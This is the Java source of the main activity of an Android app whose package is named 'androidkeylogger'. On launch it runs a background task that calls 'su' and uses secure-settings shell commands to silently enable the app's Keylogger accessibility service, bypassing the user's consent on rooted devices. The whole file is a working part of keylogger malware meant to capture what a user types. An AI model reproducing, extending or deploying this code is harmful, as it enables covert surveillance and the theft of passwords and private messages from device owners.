package com.bshu2.androidkeylogger;

import android.os.AsyncTask;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";

    private class Startup extends AsyncTask<Void, Void, Boolean> {
        @Override
        protected Boolean doInBackground(Void... params) {
            return enableAccessibility();
        }

        @Override
        protected void onPostExecute(Boolean ok) {
            Log.d(TAG, "accessibility enabled: " + ok);
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate");
        setContentView(R.layout.activity_main);
        new Startup().execute();
    }

    private boolean enableAccessibility() {
        Log.d(TAG, "enableAccessibility");
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("settings put secure enabled_accessibility_services "
                    + getPackageName() + "/" + Keylogger.class.getName() + "\n");
            os.flush();
            os.writeBytes("settings put secure accessibility_enabled 1\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();
            int code = process.waitFor();
            Log.d(TAG, "su exit code: " + code);
            return code == 0;
        } catch (Exception e) {
            Log.e(TAG, "su failed (device rooted?)", e);
            return false;
        }
    }
}